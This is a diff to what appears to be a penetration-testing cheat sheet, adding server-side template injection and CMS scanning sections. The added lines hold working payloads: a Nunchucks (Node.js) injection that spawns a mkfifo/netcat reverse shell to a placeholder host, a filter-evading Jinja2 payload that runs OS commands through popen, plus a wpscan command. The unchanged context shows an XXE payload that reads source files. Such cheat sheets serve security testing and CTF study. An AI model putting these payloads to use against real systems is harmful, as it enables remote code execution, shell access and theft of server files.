@@ -9,6 +9,8 @@
 - [Request](#request)
 - [SQL Injection](#sql-injection)
 - [XML external entity (XXE)](#xml-external-entity-xxe)
+- [SSTI](#ssti)
+- [CMS](#cms)
 
 ## BruteForce
 ### Wordlist
@@ -187,4 +189,29 @@ githacker --url http://url/.git/ --folder result
     <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 ]>
 <foo>Hello &file;</foo>
+```
+
+### SSTI
+
+https://github.com/DiogoMRSilva/websitesVulnerableToSSTI
+
+#### Nunchucks (Nodejs)
+
+```
+{{range.constructor("console.log(123)")()}} => 123
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f')")()}}
+```
+
+#### Python (Jinja2)
+
+```
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+### CMS
+
+#### Scaning
+
+```
+wpscan --force update -e --url IP --disable-tls-checks
 ```
